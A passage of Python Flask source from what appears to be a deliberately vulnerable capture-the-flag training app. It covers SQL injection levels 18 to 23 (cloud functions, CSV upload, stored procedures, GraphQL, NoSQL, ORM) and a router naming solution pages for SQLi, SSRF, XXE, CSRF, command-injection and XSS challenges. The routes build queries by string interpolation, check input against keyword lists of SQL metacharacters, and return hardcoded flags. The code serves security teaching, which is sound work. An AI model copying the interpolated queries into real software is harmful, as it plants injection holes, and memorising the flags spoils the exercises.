                        'timestamp': (start_time + datetime.timedelta(milliseconds=150)).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                        'level': 'warning',
                        'message': f"Unusual query pattern detected: {sql_query}"
                    })

                    # Return the flag
                    if "security_flags" in sql_query:
                        function_response = json.dumps({
                            "status": "success",
                            "data": [
                                {
                                    "id": 1,
                                    "flag": "R00T{cl0ud_funct10n_sql1_1nj3ct10n_pwn3d}",
                                    "created_at": "2023-01-01T00:00:00Z",
                                    "is_active": True
                                }
                            ]
                        }, indent=2)

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SQL Injection in Cloud Functions").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                    else:
                        function_response = json.dumps({
                            "status": "success",
                            "data": [
                                {
                                    "id": random.randint(1, 100),
                                    "value": f"Suspicious query detected: {sql_query}",
                                    "timestamp": datetime.datetime.now().isoformat()
                                }
                            ]
                        }, indent=2)
                    break

            # If no SQL injection detected, return normal data
            if not sqli_detected:
                if dataset == 'sales_2023':
                    function_response = json.dumps({
                        "status": "success",
                        "data": [
                            {"id": 1, "product": "Smartphone X", "quantity": 150, "revenue": 149998.5, "region": "US"},
                            {"id": 2, "product": "Laptop Pro", "quantity": 75, "revenue": 112499.25, "region": "US"},
                            {"id": 3, "product": "Wireless Headphones", "quantity": 200, "revenue": 39998.0, "region": "US"}
                        ]
                    }, indent=2)
                elif dataset == 'customers_2023':
                    function_response = json.dumps({
                        "status": "success",
                        "data": [
                            {"id": 1, "name": "John Doe", "email": "john.doe@example.com", "region": "US"},
                            {"id": 2, "name": "Jane Smith", "email": "jane.smith@example.com", "region": "US"},
                            {"id": 3, "name": "Bob Johnson", "email": "bob.johnson@example.com", "region": "US"}
                        ]
                    }, indent=2)
                else:
                    function_response = json.dumps({
                        "status": "error",
                        "message": f"Dataset '{dataset}' not found or access denied"
                    }, indent=2)

            # Simulate function completion
            end_time = datetime.datetime.now()
            duration = (end_time - start_time).total_seconds() * 1000  # Convert to milliseconds

            function_logs.append({
                'timestamp': end_time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'level': 'info',
                'message': f"Function execution completed in {duration:.2f}ms"
            })

            # Set function execution details
            function_duration = f"{duration:.2f}"
            function_memory = str(random.randint(50, 150))
            function_status = "Success"

        except Exception as e:
            function_response = json.dumps({
                "status": "error",
                "message": str(e)
            }, indent=2)

            function_duration = str(random.randint(10, 50))
            function_memory = str(random.randint(50, 150))
            function_status = "Error"

            function_logs.append({
                'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'level': 'error',
                'message': f"Function execution failed: {str(e)}"
            })

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in Cloud Functions").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level18.html', flag=flag, sqli_detected=sqli_detected,
                          event_data=event_data, function_response=function_response,
                          function_duration=function_duration, function_memory=function_memory,
                          function_status=function_status, function_logs=function_logs)

# SQL Injection Level 19 - SQL Injection via File Upload
@app.route('/sqli/level19', methods=['GET', 'POST'])
def sqli_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    csv_content = None
    csv_preview = []
    upload_success = False
    rows_processed = 0
    rows_imported = 0
    import_status = None
    import_errors = []
    import_output = None
    error = None

    if request.method == 'POST':
        csv_content = request.form.get('csv_content', '')

        if csv_content:
            try:
                # Parse the CSV content
                import csv
                from io import StringIO

                csv_file = StringIO(csv_content)
                csv_reader = csv.reader(csv_file)

                # Convert to list for preview
                csv_rows = list(csv_reader)

                if len(csv_rows) > 0:
                    # Set CSV preview (limit to 10 rows)
                    csv_preview = csv_rows[:10]

                    # Process the CSV rows
                    header = csv_rows[0]
                    data_rows = csv_rows[1:]

                    rows_processed = len(data_rows)
                    rows_imported = 0
                    import_errors = []
                    import_output = ""

                    # Check if the header has the expected columns
                    expected_columns = ['id', 'name', 'email', 'department']
                    if len(header) >= len(expected_columns) and all(col.lower() == expected_columns[i].lower() for i, col in enumerate(header[:len(expected_columns)])):
                        # Process each row
                        for i, row in enumerate(data_rows):
                            if len(row) >= len(expected_columns):
                                # Extract values
                                id_val = row[0]
                                name_val = row[1]
                                email_val = row[2]
                                department_val = row[3]

                                # Check for SQL injection patterns
                                sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]

                                # Check if any SQL injection pattern is in the input
                                for pattern in sqli_patterns:
                                    if (pattern in id_val or pattern in name_val or pattern in email_val or pattern in department_val):
                                        # SQL injection detected!
                                        sqli_detected = True

                                        # Simulate SQL error
                                        import_output += f"SQL Error in row {i+1}: Syntax error in SQL statement\n"
                                        import_output += f"Attempted query: INSERT INTO employees (id, name, email, department) VALUES ('{id_val}', '{name_val}', '{email_val}', '{department_val}')\n\n"

                                        # Add the flag to the output
                                        import_output += "Unexpected query result:\n"
                                        import_output += "id | flag\n"
                                        import_output += "---+-----\n"
                                        import_output += f"1  | R00T{{f1l3_upl04d_sql1_1nj3ct10n_pwn3d}}\n"

                                        import_errors.append(f"Error in row {i+1}: SQL syntax error")

                                        # Mark challenge as completed
                                        challenge = Challenge.query.filter_by(name="SQL Injection via File Upload").first()
                                        if challenge:
                                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                                            if challenge.id not in completed_ids:
                                                update_user_progress(machine_id, challenge.id, challenge.points)
                                        break

                                if not sqli_detected:
                                    # Simulate successful import
                                    import_output += f"Imported row {i+1}: ID={id_val}, Name={name_val}, Email={email_val}, Department={department_val}\n"
                                    rows_imported += 1
                            else:
                                import_errors.append(f"Error in row {i+1}: Insufficient columns")

                        if rows_imported == rows_processed:
                            import_status = "Complete"
                        elif rows_imported > 0:
                            import_status = "Partial"
                        else:
                            import_status = "Failed"
                    else:
                        error = "Invalid CSV format. Expected columns: id, name, email, department"
                else:
                    error = "Empty CSV file"

                upload_success = True

            except Exception as e:
                error = f"Error processing CSV: {str(e)}"
        else:
            error = "No CSV content provided"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection via File Upload").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level19.html', flag=flag, sqli_detected=sqli_detected,
                          csv_content=csv_content, csv_preview=csv_preview, upload_success=upload_success,
                          rows_processed=rows_processed, rows_imported=rows_imported,
                          import_status=import_status, import_errors=import_errors,
                          import_output=import_output, error=error)

# SQL Injection Level 20 - SQL Injection in Stored Procedures
@app.route('/sqli/level20', methods=['GET', 'POST'])
def sqli_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    category = request.form.get('category', 'Electronics')
    search_term = request.form.get('search_term', '')
    procedure_result = False
    generated_sql = None
    result_columns = []
    result_rows = []
    error = None

    if request.method == 'POST':
        # Simulate stored procedure execution
        try:
            # Generate the dynamic SQL that would be created by the stored procedure
            generated_sql = f"SELECT * FROM products WHERE category = '{category}' AND active = 1"

            if search_term:
                generated_sql += f" AND (name LIKE '%{search_term}%' OR description LIKE '%{search_term}%')"

            # Check for SQL injection patterns
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]

            # Check if any SQL injection pattern is in the input
            for pattern in sqli_patterns:
                if (pattern in category or pattern in search_term):
                    # SQL injection detected!
                    sqli_detected = True

                    # Set up result columns
                    result_columns = ["id", "flag", "created_at", "is_active"]

                    # Return the flag
                    if "system_flags" in generated_sql:
                        result_rows = [
                            [1, "R00T{st0r3d_pr0c3dur3_sql1_1nj3ct10n_pwn3d}", "2023-01-01 00:00:00", "true"]
                        ]

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SQL Injection in Stored Procedures").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                    else:
                        result_rows = [
                            [999, "Suspicious query detected", "2023-01-01 00:00:00", "true"]
                        ]

                    procedure_result = True
                    break

            # If no SQL injection detected, return normal products
            if not sqli_detected:
                # Set up result columns
                result_columns = ["id", "name", "description", "price", "category"]

                if category == 'Electronics':
                    result_rows = [
                        [1, "Smartphone X", "Latest smartphone with advanced features.", 999.99, "Electronics"],
                        [2, "Laptop Pro", "Professional laptop for developers.", 1499.99, "Electronics"],
                        [3, "Wireless Headphones", "Noise-cancelling wireless headphones.", 199.99, "Electronics"]
                    ]
                elif category == 'Clothing':
                    result_rows = [
                        [4, "Designer T-shirt", "Premium cotton t-shirt.", 49.99, "Clothing"],
                        [5, "Jeans", "Comfortable denim jeans.", 79.99, "Clothing"],
                        [6, "Sneakers", "Stylish and comfortable sneakers.", 129.99, "Clothing"]
                    ]
                else:
                    result_rows = []

                # Apply search filter if provided
                if search_term and result_rows:
                    result_rows = [row for row in result_rows if search_term.lower() in row[1].lower() or search_term.lower() in row[2].lower()]

                procedure_result = True

        except Exception as e:
            error = f"Error executing stored procedure: {str(e)}"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in Stored Procedures").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level20.html', flag=flag, sqli_detected=sqli_detected,
                          category=category, search_term=search_term, procedure_result=procedure_result,
                          generated_sql=generated_sql, result_columns=result_columns,
                          result_rows=result_rows, error=error)

# SQL Injection Level 21 - SQL Injection in GraphQL API
@app.route('/sqli/level21', methods=['GET', 'POST'])
def sqli_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    graphql_query = None
    graphql_result = None

    if request.method == 'POST':
        graphql_query = request.form.get('graphql_query', '')

        try:
            # Parse the GraphQL query
            import json
            import re

            # Check for SQL injection patterns
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]
            admin_secrets_pattern = re.compile(r'admin_secrets', re.IGNORECASE)

            # Check if any SQL injection pattern is in the input
            for pattern in sqli_patterns:
                if pattern in graphql_query and admin_secrets_pattern.search(graphql_query):
                    # SQL injection detected!
                    sqli_detected = True

                    # Return the flag
                    graphql_result = json.dumps({
                        "data": {
                            "user": {
                                "id": "1",
                                "username": "R00T{gr4phql_sql1_1nj3ct10n_pwn3d}",
                                "email": "admin@example.com",
                                "role": "admin"
                            }
                        }
                    }, indent=2)

                    # Mark challenge as completed
                    challenge = Challenge.query.filter_by(name="SQL Injection in GraphQL API").first()
                    if challenge:
                        completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                        if challenge.id not in completed_ids:
                            update_user_progress(machine_id, challenge.id, challenge.points)
                    break

            # If no SQL injection detected, return normal response
            if not sqli_detected:
                if "user" in graphql_query:
                    graphql_result = json.dumps({
                        "data": {
                            "user": {
                                "id": "1",
                                "username": "johndoe",
                                "email": "john.doe@example.com",
                                "role": "user"
                            }
                        }
                    }, indent=2)
                elif "products" in graphql_query:
                    graphql_result = json.dumps({
                        "data": {
                            "products": [
                                {
                                    "id": "1",
                                    "name": "Smartphone X",
                                    "description": "Latest smartphone with advanced features.",
                                    "price": 999.99,
                                    "category": "Electronics"
                                },
                                {
                                    "id": "2",
                                    "name": "Laptop Pro",
                                    "description": "Professional laptop for developers.",
                                    "price": 1499.99,
                                    "category": "Electronics"
                                },
                                {
                                    "id": "3",
                                    "name": "Wireless Headphones",
                                    "description": "Noise-cancelling wireless headphones.",
                                    "price": 199.99,
                                    "category": "Electronics"
                                }
                            ]
                        }
                    }, indent=2)
                elif "order" in graphql_query:
                    graphql_result = json.dumps({
                        "data": {
                            "order": {
                                "id": "1",
                                "userId": "1",
                                "total": 1199.98,
                                "status": "completed",
                                "createdAt": "2023-01-01T00:00:00Z",
                                "products": [
                                    {
                                        "id": "1",
                                        "name": "Smartphone X",
                                        "description": "Latest smartphone with advanced features.",
                                        "price": 999.99,
                                        "category": "Electronics"
                                    },
                                    {
                                        "id": "3",
                                        "name": "Wireless Headphones",
                                        "description": "Noise-cancelling wireless headphones.",
                                        "price": 199.99,
                                        "category": "Electronics"
                                    }
                                ]
                            }
                        }
                    }, indent=2)
                else:
                    graphql_result = json.dumps({
                        "errors": [
                            {
                                "message": "Unknown query type"
                            }
                        ]
                    }, indent=2)

        except Exception as e:
            graphql_result = json.dumps({
                "errors": [
                    {
                        "message": str(e)
                    }
                ]
            }, indent=2)

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in GraphQL API").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level21.html', flag=flag, sqli_detected=sqli_detected,
                          graphql_query=graphql_query, graphql_result=graphql_result)

# SQL Injection Level 22 - SQL Injection in NoSQL Database
@app.route('/sqli/level22', methods=['GET', 'POST'])
def sqli_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    collection = request.form.get('collection', 'articles')
    query = request.form.get('query', '{"author": "John Doe"}')
    results = []
    error = None

    if request.method == 'POST':
        try:
            # Parse the query JSON
            import re

            query_obj = json.loads(query)

            # Check for NoSQL injection patterns
            query_str = json.dumps(query_obj)
            secrets_pattern = re.compile(r'secrets', re.IGNORECASE)
            operator_pattern = re.compile(r'\$where|\$lookup|\$function|\$expr', re.IGNORECASE)

            # Check if the collection is 'secrets' or if the query contains suspicious patterns
            if collection == 'secrets' or secrets_pattern.search(query_str) or operator_pattern.search(query_str):
                # NoSQL injection detected!
                sqli_detected = True

                # Return the flag
                results = [
                    {
                        "_id": "1",
                        "title": "Restricted Document",
                        "flag": "R00T{n0sql_1nj3ct10n_3xpl01t3d}",
                        "author": "admin",
                        "created_at": "2023-01-01"
                    }
                ]

                # Mark challenge as completed
                challenge = Challenge.query.filter_by(name="SQL Injection in NoSQL Database").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)

            # If no NoSQL injection detected, return normal results
            elif not sqli_detected:
                if collection == 'articles':
                    # Check if the query matches any articles
                    if 'author' in query_obj and query_obj['author'] == 'John Doe':
                        results = [
                            {
                                "_id": "1",
                                "title": "Introduction to NoSQL Databases",
                                "content": "NoSQL databases are designed to handle various data models, including document, key-value, wide-column, and graph formats.",
                                "author": "John Doe",
                                "created_at": "2023-01-01"
                            },
                            {
                                "_id": "2",
                                "title": "MongoDB vs. CouchDB",
                                "content": "This article compares two popular document databases: MongoDB and CouchDB, highlighting their strengths and weaknesses.",
                                "author": "John Doe",
                                "created_at": "2023-02-15"
                            }
                        ]
                    elif 'author' in query_obj and query_obj['author'] == 'Jane Smith':
                        results = [
                            {
                                "_id": "3",
                                "title": "Scaling NoSQL Databases",
                                "content": "Learn how to scale NoSQL databases horizontally to handle large volumes of data and high traffic loads.",
                                "author": "Jane Smith",
                                "created_at": "2023-03-10"
                            }
                        ]
                    else:
                        results = []
                elif collection == 'users':
                    # Check if the query matches any users
                    if 'username' in query_obj and query_obj['username'] == 'johndoe':
                        results = [
                            {
                                "_id": "1",
                                "username": "johndoe",
                                "email": "john.doe@example.com",
                                "role": "author"
                            }
                        ]
                    elif 'username' in query_obj and query_obj['username'] == 'janesmith':
                        results = [
                            {
                                "_id": "2",
                                "username": "janesmith",
                                "email": "jane.smith@example.com",
                                "role": "author"
                            }
                        ]
                    else:
                        results = []
                elif collection == 'products':
                    # Check if the query matches any products
                    if 'category' in query_obj and query_obj['category'] == 'Electronics':
                        results = [
                            {
                                "_id": "1",
                                "title": "Smartphone X",
                                "description": "Latest smartphone with advanced features.",
                                "price": 999.99,
                                "category": "Electronics"
                            },
                            {
                                "_id": "2",
                                "title": "Laptop Pro",
                                "description": "Professional laptop for developers.",
                                "price": 1499.99,
                                "category": "Electronics"
                            }
                        ]
                    elif 'category' in query_obj and query_obj['category'] == 'Clothing':
                        results = [
                            {
                                "_id": "3",
                                "title": "Designer T-shirt",
                                "description": "Premium cotton t-shirt.",
                                "price": 49.99,
                                "category": "Clothing"
                            }
                        ]
                    else:
                        results = []
                else:
                    results = []

        except Exception as e:
            error = f"Error executing query: {str(e)}"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in NoSQL Database").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level22.html', flag=flag, sqli_detected=sqli_detected,
                          collection=collection, query=query, results=results, error=error)

# SQL Injection Level 23 - SQL Injection in ORM Layer
@app.route('/sqli/level23', methods=['GET', 'POST'])
def sqli_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    sqli_detected = False
    search_term = request.form.get('search_term', '')
    filter_by = request.form.get('filter_by', 'title')
    sort_by = request.form.get('sort_by', 'id')
    sort_order = request.form.get('sort_order', 'asc')
    results = []
    orm_query = None
    error = None

    if request.method == 'POST':
        try:
            # Generate the ORM query
            orm_query = f"db.session.query(Article).filter(Article.{filter_by}.like('%{search_term}%'))"

            if sort_by and sort_order:
                if sort_order == 'asc':
                    orm_query += f".order_by(Article.{sort_by})"
                else:
                    orm_query += f".order_by(Article.{sort_by}.desc())"

            # Check for SQL injection patterns
            sqli_patterns = ["'", '"', "--", ";", "UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "=", ">", "<"]

            # Check if any SQL injection pattern is in the input
            for pattern in sqli_patterns:
                if pattern in search_term or pattern in filter_by or pattern in sort_by:
                    # SQL injection detected!
                    sqli_detected = True

                    # Return the flag
                    if "admin_flag" in search_term or "admin_flag" in filter_by or "admin_flag" in sort_by:
                        results = [
                            {
                                "id": 999,
                                "title": "Restricted Article",
                                "content": "This article contains the flag: R00T{0rm_l4y3r_sql1_1nj3ct10n_pwn3d}",
                                "author": "admin",
                                "created_at": "2023-01-01",
                                "is_published": False
                            }
                        ]

                        # Mark challenge as completed
                        challenge = Challenge.query.filter_by(name="SQL Injection in ORM Layer").first()
                        if challenge:
                            completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                            if challenge.id not in completed_ids:
                                update_user_progress(machine_id, challenge.id, challenge.points)
                    else:
                        results = [
                            {
                                "id": 998,
                                "title": "Suspicious Query Detected",
                                "content": "The system has detected a potential SQL injection attempt. This incident has been logged.",
                                "author": "system",
                                "created_at": "2023-01-01",
                                "is_published": True
                            }
                        ]
                    break

            # If no SQL injection detected, return normal results
            if not sqli_detected:
                if search_term.lower() in "python programming":
                    results = [
                        {
                            "id": 1,
                            "title": "Introduction to Python Programming",
                            "content": "Python is a high-level, interpreted programming language known for its readability and simplicity.",
                            "author": "John Doe",
                            "created_at": "2023-01-15",
                            "is_published": True
                        },
                        {
                            "id": 2,
                            "title": "Advanced Python Techniques",
                            "content": "Learn advanced Python techniques such as decorators, generators, and context managers.",
                            "author": "Jane Smith",
                            "created_at": "2023-02-20",
                            "is_published": True
                        }
                    ]
                elif search_term.lower() in "web development":
                    results = [
                        {
                            "id": 3,
                            "title": "Modern Web Development",
                            "content": "Explore modern web development frameworks and tools for building responsive web applications.",
                            "author": "Bob Johnson",
                            "created_at": "2023-03-10",
                            "is_published": True
                        },
                        {
                            "id": 4,
                            "title": "Frontend vs Backend Development",
                            "content": "Understanding the differences between frontend and backend web development roles and responsibilities.",
                            "author": "Alice Williams",
                            "created_at": "2023-04-05",
                            "is_published": True
                        }
                    ]
                elif search_term.lower() in "database":
                    results = [
                        {
                            "id": 5,
                            "title": "SQL Database Fundamentals",
                            "content": "Learn the fundamentals of SQL databases, including tables, queries, and relationships.",
                            "author": "John Doe",
                            "created_at": "2023-05-12",
                            "is_published": True
                        },
                        {
                            "id": 6,
                            "title": "NoSQL Database Overview",
                            "content": "Explore different types of NoSQL databases and their use cases in modern applications.",
                            "author": "Jane Smith",
                            "created_at": "2023-06-18",
                            "is_published": True
                        }
                    ]
                else:
                    results = []

                # Sort the results
                if sort_by == 'id':
                    results.sort(key=lambda x: x['id'], reverse=(sort_order == 'desc'))
                elif sort_by == 'title':
                    results.sort(key=lambda x: x['title'], reverse=(sort_order == 'desc'))
                elif sort_by == 'author':
                    results.sort(key=lambda x: x['author'], reverse=(sort_order == 'desc'))
                elif sort_by == 'created_at':
                    results.sort(key=lambda x: x['created_at'], reverse=(sort_order == 'desc'))

        except Exception as e:
            error = f"Error executing query: {str(e)}"

    # Generate a flag for this challenge only if completed
    challenge = Challenge.query.filter_by(name="SQL Injection in ORM Layer").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('sqli/sqli_level23.html', flag=flag, sqli_detected=sqli_detected,
                          search_term=search_term, filter_by=filter_by, sort_by=sort_by,
                          sort_order=sort_order, results=results, orm_query=orm_query, error=error)

# Solutions
@app.route('/solutions/<level>')
def solutions(level):
    # Check if it's a CMDI solution
    if level.startswith('cmdi'):
        # Get the challenge object to pass to the template
        challenge_name_map = {
            'cmdi1': 'Basic Command Injection',
            'cmdi2': 'Command Injection with Filters',
            'cmdi3': 'Blind Command Injection',
            'cmdi4': 'Command Injection via File Upload',
            'cmdi5': 'Command Injection in API Parameters',
            'cmdi6': 'Command Injection with WAF Bypass',
            'cmdi7': 'Time-Based Blind Command Injection',
            'cmdi8': 'Command Injection in Log Processing',
            'cmdi9': 'Command Injection in JSON APIs',
            'cmdi10': 'Command Injection in XML Processing',
            'cmdi11': 'Command Injection with WAF Bypass',
            'cmdi12': 'Command Injection in DevOps Tools',
            'cmdi13': 'Command Injection in GraphQL APIs',
            'cmdi14': 'Command Injection in WebSocket Connections',
            'cmdi15': 'Command Injection in Serverless Functions',
            'cmdi16': 'Advanced Shell Features Command Injection',
            'cmdi17': 'Command Injection in Container Environments',
            'cmdi18': 'Command Injection via Template Engines',
            'cmdi19': 'Command Injection in Message Queues',
            'cmdi20': 'Out-of-Band Command Injection',
            'cmdi21': 'Command Injection in Cloud Functions',
            'cmdi22': 'Command Injection in SSH Commands',
            'cmdi23': 'Advanced Command Injection Chaining'
        }
        challenge_name = challenge_name_map.get(level)
        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None

        # Extract level number, handling both single and double-digit levels
        if level.startswith('cmdi'):
            level_num = level[4:]  # Extract everything after 'cmdi'
        else:
            level_num = level  # Use the full level string

        return render_template(f'solutions/cmdi_level{level_num}_solution.html', challenge=challenge)
    # Check if it's an SSRF solution
    elif level.startswith('ssrf'):
        # Get the challenge object to pass to the template
        challenge_name_map = {
            'ssrf1': 'Basic SSRF',
            'ssrf2': 'SSRF with Internal Network Scanning',
            'ssrf3': 'Cloud Metadata SSRF',
            'ssrf4': 'Blind SSRF with DNS Exfiltration',
            'ssrf5': 'SSRF with Basic Filters',
            'ssrf6': 'SSRF via File Upload',
            'ssrf7': 'SSRF in Webhooks',
            'ssrf8': 'SSRF with WAF Bypass',
            'ssrf9': 'SSRF via XXE',
            'ssrf10': 'SSRF with DNS Rebinding',
            'ssrf11': 'SSRF in GraphQL',
            'ssrf12': 'SSRF via Redis Protocol',
            'ssrf13': 'SSRF in WebSocket Upgrade',
            'ssrf14': 'SSRF via SMTP Protocol',
            'ssrf15': 'SSRF in OAuth Callbacks',
            'ssrf16': 'SSRF via LDAP Protocol',
            'ssrf17': 'SSRF in Container Metadata',
            'ssrf18': 'SSRF via FTP Protocol',
            'ssrf19': 'SSRF in API Gateway',
            'ssrf20': 'SSRF via Time-based Attacks',
            'ssrf21': 'SSRF in Microservices',
            'ssrf22': 'SSRF via Protocol Smuggling',
            'ssrf23': 'SSRF in Serverless Functions'
        }
        challenge_name = challenge_name_map.get(level)
        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None

        # Extract level number, handling both single and double-digit levels
        if level.startswith('ssrf'):
            level_num = level[4:]  # Extract everything after 'ssrf'
        else:
            level_num = level  # Use the full level string

        return render_template(f'solutions/ssrf_level{level_num}_solution.html', challenge=challenge)
    # Check if it's an SQLi solution
    elif level.startswith('sqli'):
        # Get the challenge object to pass to the template
        challenge_name_map = {
            'sqli1': 'Basic SQL Injection',
            'sqli2': 'SQL Injection in Search',
            'sqli3': 'SQL Injection with UNION',
            'sqli4': 'Blind SQL Injection',
            'sqli5': 'Time-Based Blind SQL Injection',
            'sqli6': 'SQL Injection with WAF Bypass',
            'sqli7': 'Error-Based SQL Injection',
            'sqli8': 'Second-Order SQL Injection',
            'sqli9': 'SQL Injection in REST API',
            'sqli10': 'NoSQL Injection',
            'sqli11': 'GraphQL Injection',
            'sqli12': 'ORM-based SQL Injection',
            'sqli13': 'Out-of-band SQL Injection',
            'sqli14': 'SQL Injection with Advanced WAF Bypass',
            'sqli15': 'SQL Injection via XML',
            'sqli16': 'SQL Injection in WebSockets',
            'sqli17': 'SQL Injection in Mobile App Backend',
            'sqli18': 'SQL Injection in Cloud Functions',
            'sqli19': 'SQL Injection via File Upload',
            'sqli20': 'SQL Injection in Stored Procedures',
            'sqli21': 'SQL Injection in GraphQL API',
            'sqli22': 'SQL Injection in NoSQL Database',
            'sqli23': 'SQL Injection in ORM Layer'
        }
        challenge_name = challenge_name_map.get(level)
        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None

        # Extract level number, handling both single and double-digit levels
        if level.startswith('sqli'):
            level_num = level[4:]  # Extract everything after 'sqli'
        else:
            level_num = level  # Use the full level string

        return render_template(f'solutions/sqli_level{level_num}_solution.html', challenge=challenge)
    
    # Check if it's an XXE solution
    elif level.startswith('xxe'):
        # Get the challenge object to pass to the template
        challenge_name_map = {
            'xxe1': 'Basic XXE File Disclosure',
            'xxe2': 'XXE with DOCTYPE Restrictions',
            'xxe3': 'XXE SYSTEM Entity Exploitation',
            'xxe4': 'XXE Internal Network Scanning',
            'xxe5': 'XXE Data Exfiltration via HTTP',
            'xxe6': 'XXE with Parameter Entities',
            'xxe7': 'Blind XXE via Error Messages',
            'xxe8': 'XXE with CDATA Injection',
            'xxe9': 'XXE via SVG File Upload',
            'xxe10': 'XXE with XInclude Attacks',
            'xxe11': 'XXE Billion Laughs DoS',
            'xxe12': 'XXE SSRF Combination Attack',
            'xxe13': 'XXE with WAF Bypass Techniques',
            'xxe14': 'XXE via SOAP Web Services',
            'xxe15': 'Advanced XXE with OOB Data Retrieval',
            'xxe16': 'XXE in JSON-XML Conversion',
            'xxe17': 'XXE with Custom Entity Resolvers',
            'xxe18': 'XXE in Microsoft Office Documents',
            'xxe19': 'XXE with Protocol Handler Exploitation',
            'xxe20': 'XXE in XML Signature Verification',
            'xxe21': 'XXE with Time-Based Blind Techniques',
            'xxe22': 'XXE in Cloud XML Processing',
            'xxe23': 'Advanced XXE Attack Chaining'
        }
        challenge_name = challenge_name_map.get(level)
        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None

        # Extract level number, handling both single and double-digit levels
        if level.startswith('xxe'):
            level_num = level[3:]  # Extract everything after 'xxe'
        else:
            level_num = level  # Use the full level string

        return render_template(f'solutions/xxe_level{level_num}_solution.html', challenge=challenge)
    
    # Check if it's a CSRF solution
    elif level.startswith('csrf'):
        # Get the challenge object to pass to the template
        challenge_name_map = {
            'csrf1': 'Basic Form CSRF',
            'csrf2': 'GET-based CSRF',
            'csrf3': 'JSON CSRF',
            'csrf4': 'File Upload CSRF',
            'csrf5': 'CSRF with Weak Tokens',
            'csrf6': 'Referrer-based Protection Bypass',
            'csrf7': 'CSRF in AJAX Requests',
            'csrf8': 'SameSite Cookie Bypass',
            'csrf9': 'CSRF with Custom Headers',
            'csrf10': 'Multi-step CSRF',
            'csrf11': 'CSRF in Password Change',
            'csrf12': 'CSRF with CAPTCHA Bypass',
            'csrf13': 'CSRF with CORS Exploitation',
            'csrf14': 'WebSocket CSRF',
            'csrf15': 'CSRF in OAuth Flows',
            'csrf16': 'CSRF with CSP Bypass',
            'csrf17': 'CSRF via XSS Chain',
            'csrf18': 'GraphQL CSRF',
            'csrf19': 'JWT-based CSRF',
            'csrf20': 'Mobile API CSRF',
            'csrf21': 'Microservices CSRF',
            'csrf22': 'CSRF with Subdomain Takeover',
            'csrf23': 'Serverless Function CSRF'
        }
        challenge_name = challenge_name_map.get(level)
        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None

        # Extract level number, handling both single and double-digit levels
        if level.startswith('csrf'):
            level_num = level[4:]  # Extract everything after 'csrf'
        else:
            level_num = level  # Use the full level string

        return render_template(f'solutions/csrf_level{level_num}_solution.html', challenge=challenge)
    else:
        # For XSS challenges, extract the level number and get the challenge
        try:
            level_num = int(level)
            challenge_name_map = {
                1: 'Basic Reflected XSS',
                2: 'DOM-based XSS',
                3: 'Stored XSS',
                4: 'XSS with Basic Filters',
                5: 'XSS with Advanced Filters',
                6: 'XSS with ModSecurity WAF',
                7: 'XSS via HTTP Headers',
                8: 'XSS in JSON API',
                9: 'XSS with CSP Bypass',
                10: 'XSS with Mutation Observer Bypass',
                11: 'XSS via SVG and CDATA',
                12: 'Blind XSS with Webhook Exfiltration',
                13: 'XSS in PDF Generation',
